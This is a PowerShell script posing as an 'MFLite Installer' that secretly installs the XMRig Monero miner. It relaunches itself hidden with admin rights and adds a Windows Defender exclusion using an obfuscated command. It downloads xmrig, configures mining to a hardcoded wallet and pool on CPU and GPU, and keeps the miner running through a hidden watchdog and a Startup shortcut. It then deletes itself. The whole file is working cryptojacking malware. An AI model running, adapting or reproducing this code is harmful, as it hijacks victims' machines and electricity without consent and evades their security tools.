$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL   = "gulf.moneroocean.stream:10001"
$THREADS = 25
$BASE   = "$env:ProgramData\MFLite"
$XMRIG  = "$BASE\xmrig.exe"
$CFG    = "$BASE\config.json"
$LOG    = "$BASE\mfl.log"
$FLAG   = "$BASE\.installed"
$VER_FILE = "$BASE\.version"

function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Out-File -FilePath $LOG -Encoding UTF8 -Append
}

Write-Log "=== MFLite Installer Started ==="

if ((Test-Path $FLAG) -and (Test-Path $XMRIG)) {
    $p = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($p) { Write-Log "Already running (PID $($p.Id)). Exiting."; exit 0 }
    & wscript.exe "$BASE\watchdog.vbs" 2>$null
    Write-Log "Watchdog restarted. Exiting."
    exit 0
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Log "Re-launching as Administrator..."
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""
    exit 0
}

Write-Log "Running with Admin privileges."

New-Item -ItemType Directory -Path $BASE -Force | Out-Null

try {
    $c1 = "Add-Mp"; $c2 = "Preference"; $c3 = "-Exclusion"; $c4 = "Path"
    iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added for $BASE"
} catch {
    Write-Log "Defender exclusion failed: $($_.Exception.Message)"
}

Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
Start-Sleep 1

$zipPath = "$BASE\xm.zip"
$downloaded = $false
$headers = @{"User-Agent" = "MFLite/1.1"}

try {
    Write-Log "Checking GitHub (xmrig/xmrig) for latest release..."
    $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers $headers -TimeoutSec 20
    $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64" -and $_.name -match "\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
    if ($asset) {
        $version = $rel.tag_name -replace '^v', ''
        Write-Log "Found xmrig $version ($($asset.name))"
        if (Test-Path $VER_FILE) {
            $current = Get-Content $VER_FILE -Raw -ErrorAction SilentlyContinue
            if ($current -eq $version) {
                Write-Log "Already on version $version. Skipping download."
                $downloaded = "skip"
            }
        }
        if ($downloaded -ne "skip") {
            Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) {
                $downloaded = $true
                $version | Out-File -FilePath $VER_FILE -Encoding UTF8
            }
        }
    }
} catch {
    Write-Log "xmrig/xmrig fetch failed: $($_.Exception.Message)"
}

if (-not $downloaded -or $downloaded -eq "skip") {
    try {
        Write-Log "Checking GitHub (MoneroOcean/xmrig) for latest release..."
        $rel = Invoke-RestMethod "https://api.github.com/repos/MoneroOcean/xmrig/releases/latest" -Headers $headers -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match "win64" -and $_.name -match "\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if ($asset) {
            $version = $rel.tag_name -replace '^v', ''
            Write-Log "Found MoneroOcean xmrig $version ($($asset.name))"
            if (Test-Path $VER_FILE) {
                $current = Get-Content $VER_FILE -Raw -ErrorAction SilentlyContinue
                if ($current -eq $version) {
                    Write-Log "Already on version $version. Skipping download."
                    $downloaded = "skip"
                }
            }
            if ($downloaded -ne "skip") {
                Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
                if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) {
                    $downloaded = $true
                    $version | Out-File -FilePath $VER_FILE -Encoding UTF8
                }
            }
        }
    } catch {
        Write-Log "MoneroOcean/xmrig fetch failed: $($_.Exception.Message)"
    }
}

if (-not $downloaded -or $downloaded -eq "skip") {
    if ($downloaded -eq "skip") {
        Write-Log "Version current — proceeding with existing binary."
    } else {
        Write-Log "ERROR: Failed to download xmrig from both sources."
        exit 1
    }
} else {
    Write-Log "Extracting $zipPath..."
    $tmp = "$BASE\_tmp"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
    $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) {
        Copy-Item $exe.FullName $XMRIG -Force
        Write-Log "xmrig.exe copied to $XMRIG"
    }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

if (-not (Test-Path $XMRIG)) {
    Write-Log "ERROR: xmrig.exe not found after extraction."
    exit 1
}

$gpuVendor = "none"
$vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
foreach ($v in $vc) {
    if ($v.Name -and $v.Name -notmatch "Microsoft|RDP|Remote|Virtual|VBox|VMware") {
        if ($v.Name -match "NVIDIA|GeForce|RTX|GTX") { $gpuVendor = "nvidia"; break }
        elseif ($v.Name -match "Radeon|AMD|ATI") { $gpuVendor = "amd"; break }
    }
}
Write-Log "GPU vendor detected: $gpuVendor"

$worker = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]", "").ToLower()
if (-not $worker) { $worker = "w$(Get-Random -Maximum 9999)" }

$cfgJson = @"
{
  "autosave": false,
  "background": false,
  "colors": false,
  "donate-level": 1,
  "log-file": "$($BASE -replace '\\','\\\\')\\mfl.log",
  "print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "cpu": { "enabled": true, "max-threads-hint": $THREADS, "priority": 0 },
  "opencl": { "enabled": $(if ($gpuVendor -eq 'amd') { 'true' } else { 'false' }) },
  "cuda": { "enabled": $(if ($gpuVendor -eq 'nvidia') { 'true' } else { 'false' }) },
  "pools": [{ "url": "$POOL", "user": "$WALLET", "pass": "$worker", "keepalive": true, "tls": false }]
}
"@
[System.IO.File]::WriteAllText($CFG, $cfgJson, (New-Object System.Text.UTF8Encoding $false))
Write-Log "Config written to $CFG"

$bat = @"
@echo off
:loop
tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I "xmrig.exe" >NUL
if errorlevel 1 (start "" /MIN "$XMRIG" --config="$CFG")
timeout /t 30 /nobreak >NUL
goto loop
"@
[System.IO.File]::WriteAllText("$BASE\watchdog.bat", $bat, (New-Object System.Text.UTF8Encoding $false))

$vbs = 'Set s=CreateObject("WScript.Shell"):s.Run """' + "$BASE\watchdog.bat" + '""",0,False'
[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", $vbs, (New-Object System.Text.UTF8Encoding $false))

$lnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialFolders("Startup")+"\MFLite.lnk"):l.TargetPath="wscript.exe":l.Arguments=""""' + "$BASE\watchdog.vbs" + '""":l.WindowStyle=7:l.Save'
[System.IO.File]::WriteAllText("$BASE\mklink.vbs", $lnkVbs, (New-Object System.Text.UTF8Encoding $false))
& wscript.exe "$BASE\mklink.vbs"
Write-Log "Startup shortcut created."

Start-Sleep 1
& wscript.exe "$BASE\watchdog.vbs"
Write-Log "Watchdog started."

Start-Sleep 2
Set-Content $FLAG -Value (Get-Date).ToString() -Encoding UTF8
Write-Log "Installation complete. Flag written."

$myPath = $MyInvocation.MyCommand.Path
if ($myPath -and (Test-Path $myPath)) {
    Start-Sleep 1
    Remove-Item $myPath -Force -ErrorAction SilentlyContinue
    Write-Log "Self-deleted installer."
}

Write-Log "=== MFLite Installer Finished ==="